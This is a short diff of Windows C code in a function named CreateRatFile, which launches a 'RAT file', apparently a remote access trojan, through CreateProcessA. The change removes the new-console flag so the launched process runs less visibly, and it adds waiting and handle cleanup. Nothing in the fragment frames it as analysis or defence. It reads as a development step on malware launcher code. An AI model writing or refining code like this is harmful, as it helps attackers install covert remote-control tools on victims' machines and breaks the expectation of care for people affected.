@@ -10,9 +10,13 @@ void CreateRatFile(HANDLE hProcess, char* szCmdLine)
     ZeroMemory(&pi, sizeof(pi));
 
     // Create a new process for the RAT file and set its parameters.
-    if (!CreateProcessA(NULL, szCmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
-    {
-        printf("Error creating process for RAT file: %lu\n", GetLastError());
+    if (CreateProcessA(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        // Wait for the process to become active.
+        WaitForInputIdle(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    } else {
+        printf("Error starting Rat File\n");
         return;
     }
 
